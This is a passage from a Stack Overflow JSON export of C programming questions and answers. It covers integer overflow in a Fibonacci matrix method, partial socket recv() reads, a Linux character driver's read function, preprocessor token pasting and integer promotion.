<i>better</i> than <code>unsigned long long</code> here.  <code>unsigned long long</code> is at least 64-bit and <code>uint64_t</code> need not exist (albeit on rare machines) to be compliant.  If anything, code could use <code>uint_least64_t</code>."}], "tags": [], "owner": {"reputation": 2223, "user_id": 1027857, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/eafd8f11220851675483c051a132c570?s=128&d=identicon&r=PG", "display_name": "toth", "link": "https://stackoverflow.com/users/1027857/toth"}, "is_accepted": true, "score": 1, "last_activity_date": 1437572123, "creation_date": 1437572123, "answer_id": 31564740, "question_id": 31564354, "link": "https://stackoverflow.com/questions/31564354/issue-finding-last-digits-of-the-nth-term-in-the-fibonacci-sequence/31564740#31564740", "title": "Issue finding last digits of the nth term in the Fibonacci sequence", "body": "<p>The issue is probably that you are running on a system where <code>long</code> is 32-bits in size, as I believe is the case for Windows. You can check this by compiling and running <code>printf(\"%d\\n\", sizeof(long))</code> which should output <code>4</code>.</p>\n\n<p>Since with <code>M=1000000=10^6</code>, the product of two numbers smaller than <code>M</code> can go up to <code>10^12</code>, you get overflow issues when you are computing your matrix entries since <code>unsigned long</code> can hold up to at most <code>2^32-1</code> or roughly <code>4 * 10^9</code>.</p>\n\n<p>To fix this simply using <code>unsigned long long</code> as your type instead of <code>unsigned long</code>. Or better yet, <code>uint64_t</code>, which is guaranteed to be 64-bits in all platforms (and which will require <code>#include &lt;stdint.h&gt;</code>). This should make your code work for <code>M</code> up to <code>sqrt(2^64)~10^9</code>. If you need bigger than that you'll need to use a big integer library.</p>\n"}, {"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 1, "last_activity_date": 1437572200, "creation_date": 1437572200, "answer_id": 31564768, "question_id": 31564354, "link": "https://stackoverflow.com/questions/31564354/issue-finding-last-digits-of-the-nth-term-in-the-fibonacci-sequence/31564768#31564768", "title": "Issue finding last digits of the nth term in the Fibonacci sequence", "body": "<p>If the program works for <code>M == 10000</code> but fails for <code>M == 1000000</code> (or even for <code>M == 100000</code>) then that probably means that your C implementation's <code>unsigned long int</code> type is 32 bits wide.</p>\n\n<p>If your matrix elements are drawn exclusively from Z<sup>10000</sup>, then they require at most 14 significant binary digits.  The products you compute in your matrix multiplication function, before reducing modulo <code>M</code>, may therefore require up to 28 binary digits.  If you increase <code>M</code> even to 100000, however, then the matrix elements require up to 17 binary digits, and the intermediate products require up to 34.  The reduction modulo <code>M</code> is too late to prevent that overflowing a 32-bit integer and therefore giving you garbage results.</p>\n\n<p>You could consider declaring the element type as <code>uint64_t</code> instead.  If it's an overflow problem then that should give you enough extra digits to handle <code>M == 1000000</code>.</p>\n"}], "owner": {"reputation": 528, "user_id": 3147102, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/d5ba477b3828f1c18b0a32429e6e967f?s=128&d=identicon&r=PG", "display_name": "Slugger", "link": "https://stackoverflow.com/users/3147102/slugger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 461, "favorite_count": 0, "accepted_answer_id": 31564740, "answer_count": 2, "score": 0, "last_activity_date": 1437572200, "creation_date": 1437571159, "last_edit_date": 1495541167, "question_id": 31564354, "link": "https://stackoverflow.com/questions/31564354/issue-finding-last-digits-of-the-nth-term-in-the-fibonacci-sequence", "title": "Issue finding last digits of the nth term in the Fibonacci sequence", "body": "<p>I wrote some code to determine the nth Fibonacci number using the nice blog post given in the accepted answer to this question: <a href=\"https://stackoverflow.com/questions/14661633/finding-out-nth-fibonacci-number-for-very-large-n\">Finding out nth fibonacci number for very large &#39;n&#39;</a>. I am doing this as a way of practising a more difficult recursion problem given on projecteuler but that is not really relevant. The method relies on changing the problem to a small linear algebra problem of the form </p>\n\n<p>Fn = T^n F1 </p>\n\n<p>where F1 = (1 1)^t and Fn contains the nth and (n-1)th Fibonacci number. The term T^n can then be determined in O(log n) time. I implemented this succesfully and it seems to work fine. When I perform the matrix exponentiation I use %10000 so I get the last 4 digits only, which seems to work (I checked against some large Fibonacci numbers). However, I wanted to try to get more last digits by increasing the number 10000. This doesn't seem to work however. I no longer get the correct answer. Here is my code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\n#include&lt;stdlib.h&gt;\n\nconst unsigned long M = 10000;\n\nunsigned long int * matProd(unsigned long int * A, unsigned long int * B){\n  unsigned long int * C;\n  C = malloc(4*sizeof(unsigned long int));\n  C[0] = ((A[0]*B[0]%M) + (A[1]*B[2]%M)) % M;\n  C[1] = ((A[0]*B[1]%M) + (A[1]*B[3]%M)) % M;\n  C[2] = ((A[2]*B[0]%M) + (A[3]*B[2]%M)) % M;\n  C[3] = ((A[2]*B[1]%M) + (A[3]*B[3]%M)) % M;\n  return C;\n}\n\nunsigned long int * matExp(unsigned long int *A, unsigned long int n){\n  if (n==1){\n    return A;\n  }\n  if (n%2==0){\n    return matExp(matProd(A,A),n/2);\n  }\n  return matProd(A,matExp(A,n-1));\n}\n\nunsigned long int findFib(unsigned long int n){\n  unsigned long int A[4] = {0, 1, 1, 1};\n  unsigned long int * C;\n  C = malloc(4*sizeof(unsigned long int));\n  C = matExp(A,n-2);\n  return (C[2]+C[3]);\n}\n\nmain(){\n  unsigned long int n = 300;\n  printf(\"%ld\\n\",findFib(n));\n}\n</code></pre>\n\n<p>There are probably several issues there with regards to proper coding conventions and things that can be improved. I thought changing to long int might solve the problem but this does not seem to do the trick. So basically the problem is that increasing M to for instance 1000000 does not give me more digits but instead gives me nonsense. What mistake am I making?</p>\n\n<p>P.S. sorry for the poor math formatting, I am used to math.stackexchange.</p>\n"}, {"tags": ["c", "sockets", "embedded-linux"], "comments": [{"owner": {"reputation": 393, "user_id": 1015192, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vR9UX.jpg?s=128&g=1", "display_name": "pedwards", "link": "https://stackoverflow.com/users/1015192/pedwards"}, "edited": false, "score": 0, "creation_date": 1437571455, "post_id": 31563931, "comment_id": 51084368, "body": "You code is wrong and incomplete.  What is <code>msgLength</code>?"}, {"owner": {"reputation": 1203, "user_id": 4400861, "user_type": "registered", "accept_rate": 93, "profile_image": "https://lh4.googleusercontent.com/-8UCNS8HZeso/AAAAAAAAAAI/AAAAAAAAAs0/Sg0T6EGGYy8/photo.jpg?sz=128", "display_name": "Abdessamad Doughri", "link": "https://stackoverflow.com/users/4400861/abdessamad-doughri"}, "reply_to_user": {"reputation": 393, "user_id": 1015192, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vR9UX.jpg?s=128&g=1", "display_name": "pedwards", "link": "https://stackoverflow.com/users/1015192/pedwards"}, "edited": false, "score": 0, "creation_date": 1437571962, "post_id": 31563931, "comment_id": 51084741, "body": "you&#39;re right I&#39;ve modified it&#39;s &quot;length&quot; because I&#39;ve copied it from big source code"}, {"owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 0, "creation_date": 1437575880, "post_id": 31563931, "comment_id": 51087999, "body": "Did you try to print the actual value of len received from network ? I cannot guess whether <code>&quot;%d&quot; S(4) &quot;X&quot;</code> is correct or not ..."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437577305, "post_id": 31563931, "comment_id": 51089135, "body": "Now there are two vars named &#39;length&#39;."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437577364, "post_id": 31563931, "comment_id": 51089172, "body": "You MUST handle correctly the value returned by recv(). Ignoring it is very, very bad.:("}, {"owner": {"reputation": 10650, "user_id": 847869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Uk4Ey.jpg?s=128&g=1", "display_name": "tomasz", "link": "https://stackoverflow.com/users/847869/tomasz"}, "edited": false, "score": 0, "creation_date": 1437578962, "post_id": 31563931, "comment_id": 51090421, "body": "There is too much guessing about your code. Is <code>buffer</code> the same variable as <code>char *buf</code>? If so, is it uninitialised in your original source code as well? How do you know there are bytes missing? Is <code>len</code> wrong? Is <code>length</code> wrong? Are both lengths correct but <code>buffer</code> doesn&#39;t hold what expected?"}, {"owner": {"reputation": 1203, "user_id": 4400861, "user_type": "registered", "accept_rate": 93, "profile_image": "https://lh4.googleusercontent.com/-8UCNS8HZeso/AAAAAAAAAAI/AAAAAAAAAs0/Sg0T6EGGYy8/photo.jpg?sz=128", "display_name": "Abdessamad Doughri", "link": "https://stackoverflow.com/users/4400861/abdessamad-doughri"}, "edited": false, "score": 0, "creation_date": 1437579708, "post_id": 31563931, "comment_id": 51090952, "body": "well for buf it&#39;s <b>buffer</b> just little mistake but in my code source it&#39;s correct, Ill change it right now. for the length is wrong I&#39;ve got less than real size apparently it&#39;s related to special charter in the data that I&#39;ve sent via network thanks"}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 3, "last_activity_date": 1437571076, "creation_date": 1437571076, "answer_id": 31564321, "question_id": 31563931, "link": "https://stackoverflow.com/questions/31563931/lost-recieved-data-when-calling-recv-twice-in-c-socket/31564321#31564321", "title": "Lost recieved data when calling recv twice in C socket", "body": "<p>The <code>recv()</code> function does not guarantee to read the full number of bytes specified.  Its Linux manual page describes it this way:</p>\n\n<blockquote>\n  <p>The receive calls normally return any data available, up to the requested amount, rather than waiting for receipt of the full amount requested.</p>\n</blockquote>\n\n<p>In this way it is like <code>read(2)</code>, which I prefer for most purposes.  The type of socket (stream vs. datagram) impacts this, but with either function, you may need to be prepared to loop, reading repeatedly in order to collect all the pieces of the message.</p>\n\n<p>And <em>always</em> check the return value of your syscalls.  In this case, not only do you need to do so to detect errors, you need to do so to ensure that you read correctly at all.</p>\n"}, {"tags": [], "owner": {"reputation": 6823, "user_id": 2382728, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILv9S.jpg?s=128&g=1", "display_name": "Philip Stuyck", "link": "https://stackoverflow.com/users/2382728/philip-stuyck"}, "is_accepted": false, "score": 0, "last_activity_date": 1437580588, "last_edit_date": 1437580588, "creation_date": 1437580015, "answer_id": 31567975, "question_id": 31563931, "link": "https://stackoverflow.com/questions/31563931/lost-recieved-data-when-calling-recv-twice-in-c-socket/31567975#31567975", "title": "Lost recieved data when calling recv twice in C socket", "body": "<p>You need to check the return value of recv continuously to find out how many bytes you received with each recv call. The reason is that you are using a streaming protocol and you can receive any arbitrary amount of bytes at any time and not in the way you have sent them at the sender.<br></p>\n\n<p>If you send 100 bytes and then immediately thereafter send 100 bytes again, chances are that you will receive 200 bytes but it might also be 150 and 50 or something else. Your logic should be written as such that the data stream might be chopped in many pieces of arbitrary size. So you need a loop of some kind that is calling receive all the time and fills some intermediate buffer. Only when you received 4 bytes you can know how many bytes are yet to come but you don't know how many recv calls that will take. Also if you send multiple of these kind of messages. Length followed with length bytes of data and then again length followed with data (2 messages). Be aware that you will receive this as a continuous stream so you might receive data of the previous packet together with the length of the next along with some bytes of that next message. You'll need quite some logic to cope with this because your 4 bytes of the length itself can be broken and spread over 2 recv calls or more.<br></p>\n\n<p>Also check for receiving 0 bytes because that means that the peer has closed its end of the connection.</p>\n\n<p>You should read a little more about network programming I always see the same mistakes here where people just don't get what a streaming protocol is. But this kind of information is available on the internet. First start reading, then comes understanding, then comes experimentation and coding followed by further understanding.</p>\n"}], "owner": {"reputation": 1203, "user_id": 4400861, "user_type": "registered", "accept_rate": 93, "profile_image": "https://lh4.googleusercontent.com/-8UCNS8HZeso/AAAAAAAAAAI/AAAAAAAAAs0/Sg0T6EGGYy8/photo.jpg?sz=128", "display_name": "Abdessamad Doughri", "link": "https://stackoverflow.com/users/4400861/abdessamad-doughri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1003, "favorite_count": 0, "accepted_answer_id": 31564321, "answer_count": 2, "score": -1, "last_activity_date": 1437580588, "creation_date": 1437570075, "last_edit_date": 1437579758, "question_id": 31563931, "link": "https://stackoverflow.com/questions/31563931/lost-recieved-data-when-calling-recv-twice-in-c-socket", "title": "Lost recieved data when calling recv twice in C socket", "body": "<p>I'm trying to read the first 4 bytes received from network to get the whole message length then I get all the message like this:</p>\n\n<pre><code>#include &lt;sys/socket.h&gt;\nint len,length;\nchar *buffer, lengthX[4];\nrecv(com_handle, lengthX, 4, 0);\nsscanf(lengthX, \"%\" S(4) \"X\", &amp;len);\nlength=recv(com_handle, buffer , len, 0);\n</code></pre>\n\n<p>for some reasons I loose 13 bytes of the rest of the message.\nAny Ideas?</p>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver"], "comments": [{"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1437625898, "post_id": 31563107, "comment_id": 51110511, "body": "There is a comprehensive example of character device files here: <a href=\"http://www.tldp.org/LDP/lkmpg/2.4/html/c577.htm\" rel=\"nofollow noreferrer\">Charcter Device Files</a>"}], "answers": [{"tags": [], "owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "is_accepted": false, "score": 1, "last_activity_date": 1437568622, "creation_date": 1437568622, "answer_id": 31563398, "question_id": 31563107, "link": "https://stackoverflow.com/questions/31563107/cat-function-calling-read-infinite-times/31563398#31563398", "title": "cat function calling read() infinite times", "body": "<p>You are not respecting the buffer size passed into the <code>dev_read</code> function, so you may be invoking undefined behaviour in <code>cat</code>.  Try this:</p>\n\n<pre><code>static ssize_t dev_read( struct file *filp, char *buff, size_t len, loff_t  *off )\n{\n    size_t count = 0;\n    printk( KERN_ALERT\"inside read %d\\n\", *off );\n    while( msg[count] != 0 &amp;&amp; count &lt; len )\n    {\n        put_user( msg[count], buff++ );\n        count++;\n    }\n    return count;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "is_accepted": false, "score": 5, "last_activity_date": 1437571570, "creation_date": 1437571570, "answer_id": 31564528, "question_id": 31563107, "link": "https://stackoverflow.com/questions/31563107/cat-function-calling-read-infinite-times/31564528#31564528", "title": "cat function calling read() infinite times", "body": "<p><code>.read</code> function should also correctly process its <code>len</code> and <code>off</code> arguments. The simplest way to implement reading from memory-buffered file is to use <code>simple_read_from_buffer</code> helper:</p>\n\n<pre><code>static ssize_t dev_read(struct file *filp, char *buff, size_t len, loff_t *off)\n{\n    return simple_read_from_buffer(buff, len, off, msg, 100);\n}\n</code></pre>\n\n<p>You can inspect code of that helper (defined in <code>fs/libfs.c</code>) for educational purposes.</p>\n\n<p>BTW, for your <code>.write</code> method you could use <code>simple_write_to_buffer</code> helper.</p>\n"}, {"tags": [], "owner": {"reputation": 59, "user_id": 4785765, "user_type": "registered", "profile_image": "https://graph.facebook.com/659879394117373/picture?type=large", "display_name": "Nadim Almas Siddiqui", "link": "https://stackoverflow.com/users/4785765/nadim-almas-siddiqui"}, "is_accepted": false, "score": 1, "last_activity_date": 1477223033, "last_edit_date": 1477223033, "creation_date": 1477221642, "answer_id": 40202317, "question_id": 31563107, "link": "https://stackoverflow.com/questions/31563107/cat-function-calling-read-infinite-times/40202317#40202317", "title": "cat function calling read() infinite times", "body": "<p>This problem can be solved by correctly setting <code>*off</code> (fourth parameter of <code>my_read()</code>).</p>\n\n<p>You need to return count for the first time and zero from second time onwards.</p>\n\n<pre><code>if(*off == 0) {\n    while (msg[count] != 0) {\n        put_user(msg[count], buff++);\n        count++;\n        (*off)++;\n    }\n    return count;\n}\nelse\nreturn 0;\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 4181287, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e2eb71a2c3c0a875f22f1c724fb345ef?s=128&d=identicon&r=PG&f=1", "display_name": "don", "link": "https://stackoverflow.com/users/4181287/don"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2737, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1477223033, "creation_date": 1437567965, "last_edit_date": 1466151800, "question_id": 31563107, "link": "https://stackoverflow.com/questions/31563107/cat-function-calling-read-infinite-times", "title": "cat function calling read() infinite times", "body": "<p>I am working on simple character device driver. I have implemented read and write functions in the module, the problem is when I try to read the device file using <code>cat /dev/devicefile</code> it is going into infinite loop i.e. reading the same data repeatedly. Can someone suggest me any solution to this problem? Below is my driver code.</p>\n\n<pre><code>#include&lt;linux/module.h&gt;\n#include&lt;linux/fs.h&gt;\n#include&lt;linux/string.h&gt;\n#include&lt;asm/uaccess.h&gt;\n#include&lt;linux/init.h&gt;\nMODULE_LICENSE(\"GPL\");\nMODULE_DESCRIPTION(\"character device driver\");\nMODULE_AUTHOR(\"Srinivas\");\n\nstatic char msg[100]={0};\n\nstatic int t;\n\nstatic int dev_open(struct inode *, struct file *);\nstatic int dev_rls(struct inode *, struct file *);\nstatic ssize_t dev_read(struct file *, char *,size_t, loff_t *);\nstatic ssize_t dev_write(struct file *, const char *, size_t,loff_t *);\n\nstatic struct file_operations fops =\n{\n    .read = dev_read,\n    .open = dev_open,\n    .write = dev_write,\n    .release = dev_rls,\n};\nstatic int himodule( void )\n{\n    t = 0;\n    t = register_chrdev(0, \"chardevdriver\", &amp;fops);\n    if (t &lt; 0)\n        printk(KERN_ALERT\"device registration failed\\n\");\n    else\n        printk(KERN_ALERT\"device registered successfully\\n\");\n\n    printk(KERN_ALERT\"major number is %d\", t);\n    return 0;\n}\nstatic void byemodule(void)\n{\n    unregister_chrdev(t, \"chardevdriver\");\n    printk(KERN_ALERT\"successfully unregistered\\n\");\n}\n\nstatic int dev_open(struct inode *inod, struct file *fil)\n{\n    printk(KERN_ALERT\"inside the dev open\");\n    return 0;\n}\nstatic ssize_t dev_read(struct file *filp, char *buff, size_t len, loff_t *off)\n{\n    short count = 0;\n    while (msg[count] != 0) {\n        put_user(msg[count], buff++);\n        count++;\n    }\n    return count;\n}\n\nstatic ssize_t dev_write(struct file *filp, const char *buff, size_t len, loff_t *off)\n{\n    short count = 0;\n    printk(KERN_ALERT\"inside write\\n\");\n\n    memset(msg,0,100);\n\n    printk(KERN_ALERT\" size of len is %zd\",len);\n\n    while (len &gt; 0) {\n        msg[count] = buff[count];\n        len--;\n        count++;\n    }\n    return count;\n}\n\nstatic int dev_rls(struct inode *inod,struct file *fil)\n{\n    printk(KERN_ALERT\"device closed\\n\");\n    return 0;\n}\nmodule_init(himodule);\nmodule_exit(byemodule);\n</code></pre>\n"}, {"tags": ["c", "concatenation", "c-preprocessor"], "comments": [{"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 2, "creation_date": 1437567144, "post_id": 31562719, "comment_id": 51081160, "body": "Hint : preprocessing happens before compilation, and variable names are just tokens at this point. The value they get much later at runtime are irrelevant."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 3, "creation_date": 1437567373, "post_id": 31562719, "comment_id": 51081326, "body": "You were thinking of <code>ALPHA(-1, i2)</code>."}, {"owner": {"reputation": 126541, "user_id": 153285, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/1UiET.jpg?s=128&g=1", "display_name": "Potatoswatter", "link": "https://stackoverflow.com/users/153285/potatoswatter"}, "edited": false, "score": 0, "creation_date": 1437567930, "post_id": 31562719, "comment_id": 51081758, "body": "Or is it <code>ALPHA(-i, 12)</code>? That also produces <code>-10</code>."}], "answers": [{"tags": [], "owner": {"reputation": 11506, "user_id": 5801, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/267cfaf8c1f76da3d8b3c7576a903613?s=128&d=identicon&r=PG", "display_name": "Michael Kohne", "link": "https://stackoverflow.com/users/5801/michael-kohne"}, "is_accepted": false, "score": 5, "last_activity_date": 1437567224, "creation_date": 1437567224, "answer_id": 31562819, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that/31562819#31562819", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p><code>ALPHA(i, i2)</code> becomes <code>i2-i2</code></p>\n\n<p>Per a comment above, pre-processing is textual replacement BEFORE compilation happens.</p>\n"}, {"tags": [], "owner": {"reputation": 2742, "user_id": 2771245, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vhsVn.jpg?s=128&g=1", "display_name": "mtijanic", "link": "https://stackoverflow.com/users/2771245/mtijanic"}, "is_accepted": true, "score": 7, "last_activity_date": 1437567267, "creation_date": 1437567267, "answer_id": 31562830, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that/31562830#31562830", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p>The preprocessing phase is done before any compilation and is done on text. It has no notion of variables or types (that is the compile phase), let alone actual values (runtime).</p>\n\n<p>So, what you are doing is:</p>\n\n<pre><code>1) ALPHA(i, i2)\n2) i##2-i2\n3) i2-i2\n</code></pre>\n\n<p>So you end up with <code>printf(\"%d\", i2-i2)</code> which prints zero.</p>\n"}, {"tags": [], "owner": {"reputation": 36301, "user_id": 50447, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/8c8779a33adeec01e05d5a480c7cd3c3?s=128&d=identicon&r=PG", "display_name": "Rowland Shaw", "link": "https://stackoverflow.com/users/50447/rowland-shaw"}, "is_accepted": false, "score": 6, "last_activity_date": 1437567589, "last_edit_date": 1437567589, "creation_date": 1437567318, "answer_id": 31562858, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that/31562858#31562858", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p>The preprocessor will output that as:</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n\nint main(void) {\n    int i = -1;\n    int i2 = -2;\n    printf(\"%d\", i2-i2);\n    return 0;\n}\n</code></pre>\n\n<p>So it will print zero</p>\n"}, {"tags": [], "owner": {"reputation": 126541, "user_id": 153285, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/1UiET.jpg?s=128&g=1", "display_name": "Potatoswatter", "link": "https://stackoverflow.com/users/153285/potatoswatter"}, "is_accepted": false, "score": 2, "last_activity_date": 1437568309, "creation_date": 1437568309, "answer_id": 31563268, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that/31563268#31563268", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p>You mixed up the <code>i</code> and <code>1</code> characters. Try a different text editor font.</p>\n\n<p><code>i ## 2</code> produces <code>i2</code> which happens to be valid in your program, with a value of <code>-2</code>.</p>\n\n<p><code>1 ## 2</code> is needed to get the expected <code>12</code>.</p>\n\n<p>That doesn't account for the negative sign you seem to expect, but I still like this theory.</p>\n"}, {"tags": [], "owner": {"reputation": 1043, "user_id": 5089088, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/KhHOG.jpg?s=128&g=1", "display_name": "Prerna Jain", "link": "https://stackoverflow.com/users/5089088/prerna-jain"}, "is_accepted": false, "score": 6, "last_activity_date": 1437569533, "creation_date": 1437569533, "answer_id": 31563711, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that/31563711#31563711", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p>Compilation process is a bit different in C as compared to other programming languages.\nIn C, <strong>3 phases</strong> are involved in getting an .exe file from .src file.</p>\n\n<p><em>xyz.c</em> ->  <strong>PREPROCESSOR</strong> ->   <em>tmp.c</em>(temporary)   ->  <strong>COMPILER</strong> -> <em>xyz.obj</em>-> <strong>LINKER</strong> -> <em>xyz.exe</em></p>\n\n<p>Basically, a preprocessor reads your code line by line and if it is a preprocessing statement, then only it performs the preprocessing directive and outputs your code to the Compiler in pure textual form.</p>\n\n<p>In case of your code,preprocessor will send this code to the compiler for compilation :</p>\n\n<pre><code> //includes stdio.h from include folder\n\n    int main(void)\n    {\n        int i = -1;\n        int i2 = -2;\n        printf(\"%d\", i2 - i2);\n        return 0;\n    }\n</code></pre>\n\n<p>So,when the compiler will compile this code,it will give the <strong>result</strong> for print as <strong>0</strong> only.\nThis is the reason you are getting 0 printed, when you are running the code. \nHope this will help you. </p>\n"}], "owner": {"reputation": 9795, "user_id": 1566187, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/00cb2ecc49f0f05736dc7c14bbccfeaa?s=128&d=identicon&r=PG", "display_name": "Ely", "link": "https://stackoverflow.com/users/1566187/ely"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 0, "accepted_answer_id": 31562830, "answer_count": 5, "score": 3, "last_activity_date": 1437569533, "creation_date": 1437566930, "question_id": 31562719, "link": "https://stackoverflow.com/questions/31562719/c-preprocessor-token-pasting-confusing-result-why-is-that", "title": "C preprocessor - token pasting - confusing result. Why is that?", "body": "<p>I thought this program would print the value <code>-12--2=-10</code>. When I run it, it prints <code>0</code>.</p>\n\n<p><strong>I cannot figure out why? Any hints?</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt; \n#define        ALPHA(x,y)        x##2-y \n\nint main(void) {\n    int i = -1;\n    int i2 = -2;\n    printf(\"%d\", ALPHA(i, i2));\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "variadic-functions", "integer-promotion"], "comments": [{"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 5, "creation_date": 1437566741, "post_id": 31562375, "comment_id": 51080867, "body": "The operands are being promoted to <code>int</code>s. Sign-extension of <code>0xff</code> and <code>0xffff</code> to 32 bits both yield <code>0xffffffff</code>. See sections <i>6.3.1.8 Usual arithmetic conversions</i> and <i>6.3.1.1 Boolean, characters, and integers</i> in <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">the C standard</a>."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1437566967, "post_id": 31562375, "comment_id": 51081022, "body": "Also, your assignments of things like <code>0xffff</code> to <code>int16_t</code>, and <code>0xff</code> to <code>char</code> if <code>char</code> is signed on your platform (it usually is) is implementation-defined. Regarding comparisons being the same, after the implementation=defined assignments are finished, you&#39;re left with <i>values</i> that are indeed the same (in your case, -1 all around)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437567505, "post_id": 31562375, "comment_id": 51081445, "body": "<code>sizeof</code> returns a <code>size_t</code>, not an <code>int</code>. So use the correct format specifier<code>%zu</code>. And <code>sizeof(char)</code> is <i>defined</i> <code>1</code> by the standard. So you wil never get anything else."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1437568445, "post_id": 31562375, 